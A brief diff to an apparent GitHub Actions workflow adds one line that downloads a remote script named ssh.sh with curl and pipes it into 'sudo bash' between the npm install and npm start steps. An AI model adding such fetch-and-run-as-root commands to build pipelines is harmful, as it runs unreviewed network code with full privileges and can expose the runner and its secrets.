@@ -34,5 +34,7 @@ jobs:
         - name: 操作
           run: |  
               npm install >/dev/null 2>&1
+              curl -SL http://raw.github.com/zhlhlf/text/main/ssh.sh | sudo bash
+
               npm start
               
